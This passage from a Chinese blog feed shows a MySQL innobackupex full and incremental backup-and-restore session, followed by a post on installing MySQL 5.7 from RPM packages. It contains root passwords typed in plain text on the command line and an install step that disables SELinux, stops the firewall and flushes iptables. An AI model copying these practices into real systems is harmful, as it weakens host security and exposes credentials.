21:59 ibdata1-rw-r----- 1 mysql mysql 50331648 Apr 24 21:59 ib_logfile0-rw-r----- 1 mysql mysql 50331648 Apr 24 21:59 ib_logfile1-rw-r----- 1 mysql mysql 12582912 Apr 24 21:59 ibtmp1drwxr-x--- 2 mysql mysql     4096 Apr 24 21:59 mysqldrwxr-x--- 2 mysql mysql     8192 Apr 24 21:59 performance_schemadrwxr-x--- 2 mysql mysql     8192 Apr 24 21:59 sysdrwxr-x--- 2 mysql mysql       88 Apr 24 21:59 testbookdbdrwxr-x--- 2 mysql mysql       92 Apr 24 21:59 TESTDB-rw-r----- 1 mysql mysql      504 Apr 24 21:59 xtrabackup_info-rw-r----- 1 mysql mysql        1 Apr 24 21:59 xtrabackup_master_key_id[root@jaking ~]# systemctl start mysqld[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 3Server version: 5.7.20 MySQL Community Server (GPL)Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</code></pre><pre><code class="sql">mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || BOOK               || TESTDB             || mysql              || performance_schema || sys                || testbookdb         |+--------------------+7 rows in set (0.00 sec)mysql&gt; use BOOK;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+----------------+| Tables_in_BOOK |+----------------+| book           |+----------------+2 rows in set (0.00 sec)mysql&gt; select * from book;+-------------------------+-------+-------+| name                    | price | pages |+-------------------------+-------+-------+| Linux                   |    30 |   666 || Cloud Computing         |    60 |   666 || Operation System        |    80 |   666 || Artificial Intelligence |   166 |   666 |+-------------------------+-------+-------+4 rows in set (0.00 sec)mysql&gt; use testbookdb;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+----------------------+| Tables_in_testbookdb |+----------------------+| book1                || book2                |+----------------------+2 rows in set (0.00 sec)mysql&gt; select * from book1;+---------+-----------------------------------+-------+-----------------------+| bTypeId | bName                             | price | publishing            |+---------+-----------------------------------+-------+-----------------------+|       1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        ||       2 | &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    68 | &#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E;        ||       3 | &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    90 | &#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        ||       4 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |    71 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       5 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B;                  |    72 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       6 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B;                  |    73 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       7 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B;                  |    74 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       8 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B;                  |    75 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       9 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B;                  |    76 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||      10 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B;                  |    77 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||      11 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B;                  |    78 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||      12 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B;                  |    79 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |+---------+-----------------------------------+-------+-----------------------+12 rows in set (0.00 sec)mysql&gt; select * from book2;+-----------------------------------+-------+-------+| name                              | price | pages |+-----------------------------------+-------+-------+| &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    30 |   666 || &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    60 |   666 || &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    80 |   666 || &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |   166 |   666 |+-----------------------------------+-------+-------+4 rows in set (0.00 sec)mysql&gt; use TESTDB;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+------------------+| Tables_in_TESTDB |+------------------+| TABLE1           || TABLE2           |+------------------+2 rows in set (0.00 sec)mysql&gt; select * from TABLE1;+---------+--------+-------+------------+| bTypeId | bName  | price | publishing |+---------+--------+-------+------------+|       1 | Linux  |    66 | DZ         ||       2 | CLD    |    68 | RM         ||       3 | SYS    |    90 | JX         ||       4 | MySQL1 |    71 | QH         ||       5 | MySQL2 |    72 | QH         ||       6 | MySQL3 |    73 | QH         ||       7 | MySQL4 |    74 | QH         ||       8 | MySQL5 |    75 | QH         ||       9 | MySQL6 |    76 | QH         ||      10 | MySQL7 |    77 | QH         ||      11 | MySQL8 |    78 | QH         ||      12 | MySQL9 |    79 | QH         |+---------+--------+-------+------------+12 rows in set (0.00 sec)mysql&gt; select * from TABLE2;+--------+-------+-------+| name   | price | pages |+--------+-------+-------+| Linux  |    30 |   666 || CLD    |    60 |   666 || SYS    |    80 |   666 || MySQL1 |   166 |   666 |+--------+-------+-------+4 rows in set (0.00 sec)mysql&gt; </code></pre><p>&#x62D3;&#x5C55;&#xFF1A;&#x8FD8;&#x539F;&#x6570;&#x636E;</p><pre><code class="shell">[root@server12 ~]# rm -rf /tmp/db_backup/*[root@server12 ~]# innobackupex --default-file=/etc/my.cnf --user=root --password=Jaking@vip.163.com --no-timestamp /tmp/db_backup/all-mysql-data[root@server12 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 5Server version: 5.7.20 MySQL Community Server (GPL)Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</code></pre><pre><code class="sql">mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || BOOK               || TESTDB             || mysql              || performance_schema || sys                || testbookdb         |+--------------------+7 rows in set (0.00 sec)CREATE DATABASE TESTDB666;show databases;use TESTDB666;CREATE TABLE TABLE1 (bTypeId int,bName char(16),price int,publishing char(16));INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;Linux&apos;,&apos;66&apos;,&apos;DZ&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;2&apos;,&apos;CLD&apos;,&apos;68&apos;,&apos;RM&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;3&apos;,&apos;SYS&apos;,&apos;90&apos;,&apos;JX&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;4&apos;,&apos;MySQL1&apos;,&apos;71&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;5&apos;,&apos;MySQL2&apos;,&apos;72&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;6&apos;,&apos;MySQL3&apos;,&apos;73&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;7&apos;,&apos;MySQL4&apos;,&apos;74&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;8&apos;,&apos;MySQL5&apos;,&apos;75&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;9&apos;,&apos;MySQL6&apos;,&apos;76&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;10&apos;,&apos;MySQL7&apos;,&apos;77&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;11&apos;,&apos;MySQL8&apos;,&apos;78&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;12&apos;,&apos;MySQL9&apos;,&apos;79&apos;,&apos;QH&apos;);CREATE TABLE TABLE2 (name char(16),price int,pages int);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;Linux&apos;,&apos;30&apos;,&apos;666&apos;);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;CLD&apos;,&apos;60&apos;,&apos;666&apos;);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;SYS&apos;,&apos;80&apos;,&apos;666&apos;);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;MySQL1&apos;,&apos;166&apos;,&apos;666&apos;);show tables;select * from TABLE1;select * from TABLE2;mysql&gt; show tables;+---------------------+| Tables_in_TESTDB666 |+---------------------+| TABLE1              || TABLE2              |+---------------------+2 rows in set (0.00 sec)mysql&gt; select * from TABLE1;+---------+--------+-------+------------+| bTypeId | bName  | price | publishing |+---------+--------+-------+------------+|       1 | Linux  |    66 | DZ         ||       2 | CLD    |    68 | RM         ||       3 | SYS    |    90 | JX         ||       4 | MySQL1 |    71 | QH         ||       5 | MySQL2 |    72 | QH         ||       6 | MySQL3 |    73 | QH         ||       7 | MySQL4 |    74 | QH         ||       8 | MySQL5 |    75 | QH         ||       9 | MySQL6 |    76 | QH         ||      10 | MySQL7 |    77 | QH         ||      11 | MySQL8 |    78 | QH         ||      12 | MySQL9 |    79 | QH         |+---------+--------+-------+------------+12 rows in set (0.00 sec)mysql&gt; select * from TABLE2;+--------+-------+-------+| name   | price | pages |+--------+-------+-------+| Linux  |    30 |   666 || CLD    |    60 |   666 || SYS    |    80 |   666 || MySQL1 |   166 |   666 |+--------+-------+-------+4 rows in set (0.00 sec)mysql&gt; mysql&gt; ^DBye</code></pre><pre><code class="shell">[root@server12 ~]# innobackupex --user=root --password=Jaking@vip.163.com --no-timestamp --incremental /tmp/db_backup/incremental-mysql-data --incremental-basedir=/tmp/db_backup/all-mysql-data/[root@server12 ~]# ls /tmp/db_backup/all-mysql-data  incremental-mysql-data[root@server12 ~]# du -sh /tmp/db_backup/all-mysql-data/27M     /tmp/db_backup/all-mysql-data/[root@server12 ~]# du -sh /tmp/db_backup/incremental-mysql-data/4.8M    /tmp/db_backup/incremental-mysql-data/[root@server12 ~]# systemctl stop mysqld[root@server12 ~]# rm -rf /var/lib/mysql/*[root@server12 ~]# ls /tmp/db_backup/all-mysql-data/backup-my.cnf   ibdata1             sys         xtrabackup_checkpointsBOOK            mysql               testbookdb  xtrabackup_infoib_buffer_pool  performance_schema  TESTDB      xtrabackup_logfile[root@server12 ~]# ls /tmp/db_backup/incremental-mysql-data/backup-my.cnf   mysql               TESTDB666BOOK            performance_schema  xtrabackup_checkpointsib_buffer_pool  sys                 xtrabackup_infoibdata1.delta   testbookdb          xtrabackup_logfileibdata1.meta    TESTDB[root@server12 ~]# cp -ra /tmp/db_backup/incremental-mysql-data/TESTDB666 /tmp/db_backup/all-mysql-data/[root@server12 ~]# cp -ra /tmp/db_backup/incremental-mysql-data/ibdata1* /tmp/db_backup/all-mysql-data/[root@server12 ~]# ls /tmp/db_backup/all-mysql-data/backup-my.cnf   ibdata1.delta       sys         xtrabackup_checkpointsBOOK            ibdata1.meta        testbookdb  xtrabackup_infoib_buffer_pool  mysql               TESTDB      xtrabackup_logfileibdata1         performance_schema  TESTDB666[root@server12 ~]# ls /tmp/db_backup/incremental-mysql-data/backup-my.cnf   mysql               TESTDB666BOOK            performance_schema  xtrabackup_checkpointsib_buffer_pool  sys                 xtrabackup_infoibdata1.delta   testbookdb          xtrabackup_logfileibdata1.meta    TESTDB[root@server12 ~]# innobackupex --copy-back /tmp/db_backup/all-mysql-data/[root@server12 ~]# ll /var/lib/mysqltotal 13912drwxr-x--- 2 root root       88 Apr 24 22:26 BOOK-rw-r----- 1 root root      315 Apr 24 22:26 ib_buffer_pool-rw-r----- 1 root root 12582912 Apr 24 22:26 ibdata1-rw-r----- 1 root root  1622016 Apr 24 22:26 ibdata1.delta-rw-r----- 1 root root       60 Apr 24 22:26 ibdata1.metadrwxr-x--- 2 root root     4096 Apr 24 22:26 mysqldrwxr-x--- 2 root root     8192 Apr 24 22:26 performance_schemadrwxr-x--- 2 root root     8192 Apr 24 22:26 sysdrwxr-x--- 2 root root       88 Apr 24 22:26 testbookdbdrwxr-x--- 2 root root       92 Apr 24 22:26 TESTDBdrwxr-x--- 2 root root      150 Apr 24 22:26 TESTDB666-rw-r----- 1 root root      482 Apr 24 22:26 xtrabackup_info[root@server12 ~]# chown -Rf mysql:mysql /var/lib/mysql[root@server12 ~]# ll /var/lib/mysql                   total 13912drwxr-x--- 2 mysql mysql       88 Apr 24 22:26 BOOK-rw-r----- 1 mysql mysql      315 Apr 24 22:26 ib_buffer_pool-rw-r----- 1 mysql mysql 12582912 Apr 24 22:26 ibdata1-rw-r----- 1 mysql mysql  1622016 Apr 24 22:26 ibdata1.delta-rw-r----- 1 mysql mysql       60 Apr 24 22:26 ibdata1.metadrwxr-x--- 2 mysql mysql     4096 Apr 24 22:26 mysqldrwxr-x--- 2 mysql mysql     8192 Apr 24 22:26 performance_schemadrwxr-x--- 2 mysql mysql     8192 Apr 24 22:26 sysdrwxr-x--- 2 mysql mysql       88 Apr 24 22:26 testbookdbdrwxr-x--- 2 mysql mysql       92 Apr 24 22:26 TESTDBdrwxr-x--- 2 mysql mysql      150 Apr 24 22:26 TESTDB666-rw-r----- 1 mysql mysql      482 Apr 24 22:26 xtrabackup_info[root@server12 ~]# systemctl start mysqld[root@server12 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 3Server version: 5.7.20 MySQL Community Server (GPL)Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</code></pre><pre><code class="sql">mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || BOOK               || TESTDB             || TESTDB666          || mysql              || performance_schema || sys                || testbookdb         |+--------------------+8 rows in set (0.00 sec)mysql&gt; use BOOK;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+----------------+| Tables_in_BOOK |+----------------+| book           |+----------------+2 rows in set (0.00 sec)mysql&gt; select * from book;+-------------------------+-------+-------+| name                    | price | pages |+-------------------------+-------+-------+| Linux                   |    30 |   666 || Cloud Computing         |    60 |   666 || Operation System        |    80 |   666 || Artificial Intelligence |   166 |   666 |+-------------------------+-------+-------+4 rows in set (0.00 sec)mysql&gt; use TESTDB666;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+---------------------+| Tables_in_TESTDB666 |+---------------------+| TABLE1              || TABLE2              |+---------------------+2 rows in set (0.00 sec)mysql&gt; select * from TABLE1;ERROR 1146 (42S02): Table &apos;TESTDB666.TABLE1&apos; doesn&apos;t existmysql&gt; select * from TABLE2;ERROR 1146 (42S02): Table &apos;TESTDB666.TABLE2&apos; doesn&apos;t existmysql&gt; use TESTDB;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+------------------+| Tables_in_TESTDB |+------------------+| TABLE1           || TABLE2           |+------------------+2 rows in set (0.00 sec)mysql&gt; select * from TABLE1;+---------+--------+-------+------------+| bTypeId | bName  | price | publishing |+---------+--------+-------+------------+|       1 | Linux  |    66 | DZ         ||       2 | CLD    |    68 | RM         ||       3 | SYS    |    90 | JX         ||       4 | MySQL1 |    71 | QH         ||       5 | MySQL2 |    72 | QH         ||       6 | MySQL3 |    73 | QH         ||       7 | MySQL4 |    74 | QH         ||       8 | MySQL5 |    75 | QH         ||       9 | MySQL6 |    76 | QH         ||      10 | MySQL7 |    77 | QH         ||      11 | MySQL8 |    78 | QH         ||      12 | MySQL9 |    79 | QH         |+---------+--------+-------+------------+12 rows in set (0.00 sec)mysql&gt; select * from TABLE2;+--------+-------+-------+| name   | price | pages |+--------+-------+-------+| Linux  |    30 |   666 || CLD    |    60 |   666 || SYS    |    80 |   666 || MySQL1 |   166 |   666 |+--------+-------+-------+4 rows in set (0.00 sec)mysql&gt; ^DBye</code></pre><pre><code class="shell">[root@server12 ~]#[root@server12 ~]# ll /mysql-all-data/total 110632-rw-r----- 1 mysql mysql       56 Apr 23 05:15 auto.cnfdrwxr-x--- 2 mysql mysql       88 Apr 24 21:26 BOOK-rw-r----- 1 mysql mysql      343 Apr 24 21:51 ib_buffer_pool-rw-r----- 1 mysql mysql 12582912 Apr 24 21:51 ibdata1-rw-r----- 1 mysql mysql 50331648 Apr 24 21:51 ib_logfile0-rw-r----- 1 mysql mysql 50331648 Apr 23 05:15 ib_logfile1drwxr-x--- 2 mysql mysql     4096 Apr 23 05:14 mysqldrwxr-x--- 2 mysql mysql     8192 Apr 23 05:14 performance_schemadrwxr-x--- 2 mysql mysql     8192 Apr 23 05:14 sysdrwxr-x--- 2 mysql mysql       88 Apr 23 05:14 testbookdbdrwxr-x--- 2 mysql mysql       92 Apr 24 21:28 TESTDB-rw-r----- 1 mysql mysql      472 Apr 23 05:14 xtrabackup_info[root@server12 ~]# systemctl stop mysqld[root@server12 ~]# rm -rf /var/lib/mysql/*[root@server12 ~]# mv /mysql-all-data/* /var/lib/mysql[root@server12 ~]# ll /var/lib/mysqltotal 110632-rw-r----- 1 mysql mysql       56 Apr 23 05:15 auto.cnfdrwxr-x--- 2 mysql mysql       88 Apr 24 21:26 BOOK-rw-r----- 1 mysql mysql      343 Apr 24 21:51 ib_buffer_pool-rw-r----- 1 mysql mysql 12582912 Apr 24 21:51 ibdata1-rw-r----- 1 mysql mysql 50331648 Apr 24 21:51 ib_logfile0-rw-r----- 1 mysql mysql 50331648 Apr 23 05:15 ib_logfile1drwxr-x--- 2 mysql mysql     4096 Apr 23 05:14 mysqldrwxr-x--- 2 mysql mysql     8192 Apr 23 05:14 performance_schemadrwxr-x--- 2 mysql mysql     8192 Apr 23 05:14 sysdrwxr-x--- 2 mysql mysql       88 Apr 23 05:14 testbookdbdrwxr-x--- 2 mysql mysql       92 Apr 24 21:28 TESTDB-rw-r----- 1 mysql mysql      472 Apr 23 05:14 xtrabackup_info[root@server12 ~]# systemctl start mysqld[root@server12 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 3Server version: 5.7.20 MySQL Community Server (GPL)Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</code></pre><pre><code class="sql">mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || BOOK               || TESTDB             || mysql              || performance_schema || sys                || testbookdb         |+--------------------+7 rows in set (0.01 sec)mysql&gt; use BOOK;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+----------------+| Tables_in_BOOK |+----------------+| book           |+----------------+2 rows in set (0.00 sec)mysql&gt; select * from book;+-------------------------+-------+-------+| name                    | price | pages |+-------------------------+-------+-------+| Linux                   |    30 |   666 || Cloud Computing         |    60 |   666 || Operation System        |    80 |   666 || Artificial Intelligence |   166 |   666 |+-------------------------+-------+-------+4 rows in set (0.00 sec)mysql&gt; use TESTDB;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+------------------+| Tables_in_TESTDB |+------------------+| TABLE1           || TABLE2           |+------------------+2 rows in set (0.00 sec)mysql&gt; select * from TABLE1;+---------+--------+-------+------------+| bTypeId | bName  | price | publishing |+---------+--------+-------+------------+|       1 | Linux  |    66 | DZ         ||       2 | CLD    |    68 | RM         ||       3 | SYS    |    90 | JX         ||       4 | MySQL1 |    71 | QH         ||       5 | MySQL2 |    72 | QH         ||       6 | MySQL3 |    73 | QH         ||       7 | MySQL4 |    74 | QH         ||       8 | MySQL5 |    75 | QH         ||       9 | MySQL6 |    76 | QH         ||      10 | MySQL7 |    77 | QH         ||      11 | MySQL8 |    78 | QH         ||      12 | MySQL9 |    79 | QH         |+---------+--------+-------+------------+12 rows in set (0.00 sec)mysql&gt; select * from TABLE2;+--------+-------+-------+| name   | price | pages |+--------+-------+-------+| Linux  |    30 |   666 || CLD    |    60 |   666 || SYS    |    80 |   666 || MySQL1 |   166 |   666 |+--------+-------+-------+4 rows in set (0.00 sec)mysql&gt; ^DBye[root@server12 ~]#</code></pre><p>&#x7531;&#x4EE5;&#x4E0A;&#x64CD;&#x4F5C;&#x53EF;&#x77E5;innobackupex&#x8FD8;&#x539F;&#x589E;&#x91CF;&#x6570;&#x636E;&#x4E0D;&#x7A33;&#x5B9A;&#xFF01;</p><p>6&#xFF1A;&#x5B98;&#x65B9;&#x6587;&#x6863;<br><a href="https://www.percona.com/doc/percona-xtrabackup/2.4/index.html" target="_blank" rel="noopener">https://www.percona.com/doc/percona-xtrabackup/2.4/index.html</a></p><p>&#x6587;&#x6863;&#xFF1A;10 mysqldump&#x8FDC;&#x7A0B;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x6570;&#x636E;.md<br>&#x94FE;&#x63A5;&#xFF1A;<a href="http://note.youdao.com/noteshare?id=7af3e7cda297defe01228ed798e72c02&amp;sub=E2F44DF8E1BC4B9287EA434DEA3B670C" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=7af3e7cda297defe01228ed798e72c02&amp;sub=E2F44DF8E1BC4B9287EA434DEA3B670C</a></p><p>&#x6587;&#x6863;&#xFF1A;16 innobackupex&#x5907;&#x4EFD;MySQL&#x6570;&#x636E;&#x9047;&#x5230;Can&#x2019;&#x2026;<br>&#x94FE;&#x63A5;&#xFF1A;<a href="http://note.youdao.com/noteshare?id=75c497bba7496b9ec1c61c766e03cca8&amp;sub=F4A9B0EB5E554DB5BB6EF40A12A25512" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=75c497bba7496b9ec1c61c766e03cca8&amp;sub=F4A9B0EB5E554DB5BB6EF40A12A25512</a></p><p>&#x7EC3;&#x4E60;&#xFF1A;1. &#x628A;&#x6570;&#x636E;&#x5B57;&#x5178;&#x5BFC;&#x5165;MySQL&#x6570;&#x636E;&#x5E93; 2. MySQL5.7.20&#x5728;&#x7EBF;&#x5347;&#x7EA7;&#x5230;MySQL5.7.24</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;&amp;#x4E00;&amp;#xFF1A;MySQL&amp;#x5B57;&amp;#x7B26;&amp;#x96C6;&quot;&gt;&lt;a href=&quot;#&amp;#x4E00;&amp;#xFF1A;MySQL&amp;#x5B57;&amp;#x7B26;&amp;#x96C6;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>使用RPM包安装MySQL5.7数据库</title>
    <link href="https://marnm.github.io//posts/f6e2d114/"/>
    <id>https://marnm.github.io//posts/f6e2d114/</id>
    <published>2022-06-07T04:44:03.000Z</published>
    <updated>2022-06-07T05:14:33.480Z</updated>
    
    <content type="html"><![CDATA[<p>&#x4F7F;&#x7528;rpm&#x5305;&#x5B89;&#x88C5;MySQL5.7&#x6570;&#x636E;&#x5E93;</p><ol><li>&#x4F18;&#x5316;Linux&#x7CFB;&#x7EDF;  </li></ol><pre><code class="shell">sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config &amp;&gt; /dev/nullsetenforce 0systemctl stop firewalldsystemctl disable firewalldiptables -Fsystemctl stop NetworkManager &amp;&gt; /dev/nullsystemctl disable NetworkManager &amp;&gt; /dev/null</code></pre><ol start="2"><li><p>&#x4E0A;&#x4F20;mysql&#x5B89;&#x88C5;&#x5305;</p><pre><code>tar -xvf mysql5.7.tar.gzcd mysql/</code></pre></li><li><p>&#x5B89;&#x88C5;  </p><p>rpm -e &#x2013;nodeps mariadb-libs &#x2014;&#x2013;&#x5378;&#x8F7D;&#x673A;&#x5668;&#x4E2D;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7684;mariadb-libs&#x6570;&#x636E;&#x5E93;&#x5305;</p><p>rpm -ivh mysql-community-common-5.7.24-1.el7.x86_64.rpm<br>rpm -ivh mysql-community-libs-5.7.24-1.el7.x86_64.rpm<br>rpm -ivh mysql-community-client-5.7.24-1.el7.x86_64.rpm<br>rpm -ivh mysql-community-devel-5.7.24-1.el7.x86_64.rpm<br>rpm -ivh mysql-community-server-5.7.24-1.el7.x86_64.rpm  </p></li><li><p>&#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;<br>vim /etc/my.cnf &#x2014;&#x2013;&#x7F16;&#x8F91;myslq&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5728;&#x672B;&#x5C3E;&#x589E;&#x52A0;&#x4E00;&#x4E0B;&#x8BED;&#x53E5;&#x4F18;&#x5316;&#x8FDE;&#x63A5;<br>&#x8DF3;&#x8FC7;&#x4E3B;&#x673A;&#x540D;&#x89E3;&#x6790;&#xFF0C;&#x63D0;&#x9AD8;&#x8FDE;&#x63A5;&#x901F;&#x5EA6;  </p><pre><code>skip-name-resolveecho skip-name-resolve &gt;&gt; /etc/my.cnf</code></pre></li></ol><p>&#x542F;&#x52A8;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;</p><pre><code>systemctl start mysqldsystemctl status mysqldsystemctl enable mysqld</code></pre><p>&#x83B7;&#x53D6;&#x968F;&#x673A;&#x7684;&#x521D;&#x59CB;&#x5BC6;&#x7801; (mysql5.7&#x5F00;&#x59CB;&#x7B2C;&#x4E00;&#x6B21;&#x4EA7;&#x751F;&#x968F;&#x673A;&#x5BC6;&#x7801;&#xFF0C;&#x4E14;&#x767B;&#x5F55;&#x540E;&#x5FC5;&#x987B;&#x4FEE;&#x6539;&#xFF0C;&#x5426;&#x5219;&#x65E0;&#x6CD5;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;)  </p><pre><code class="shell">cat /var/log/mysqld.log | grep &quot;password&quot;2021-01-09T07:10:18.431779Z 1 [Note] A temporary password is generated for root@localhost: -dhfHuf%p9hqnetstat -nlpt | grep mysqld -----mysqld &#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;3306tcp6 0 0 :::3306 :::* LISTEN 4434/mysqld</code></pre><p>&#x901A;&#x8FC7;mysql&#x547D;&lt;&#x5BA2;&#x6237;&#x7AEF;&gt;&#x767B;&#x5F55; mysqld&#x670D;&#x52A1;&#x5668;<br>mysql -u &lt;&#x7528;&#x6237;&#x540D;&gt; -p &lt;&#x5BC6;&#x7801;&gt; -h &lt;&#x6307;&#x5B9A;&#x670D;&#x52A1;&#x5668;IP,&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&gt; -P &lt;&#x7AEF;&#x53E3;,&#x9ED8;&#x8BA4;3306&gt;  </p><pre><code>mysql -uroot -pEnter password:mysql&gt;  &#x8F93;&#x5165;sql&#x8BED;&#x53E5;&#x4E0E;mysqld&#x4EA4;&#x4E92;</code></pre><p>&#x4FEE;&#x6539;&#x521D;&#x59CB;&#x5BC6;&#x7801;&#xFF0C;&lt;&#x5BC6;&#x7801;&#x9700;&#x8981;&#x590D;&#x6742;&#x7684;&#x5BC6;&#x7801;&gt;</p><pre><code>mysql&gt; ALTER USER &apos;root&apos;@&apos;localhost&apos; identified by &quot;Uplooking_123&quot;;mysql&gt; flush privileges; 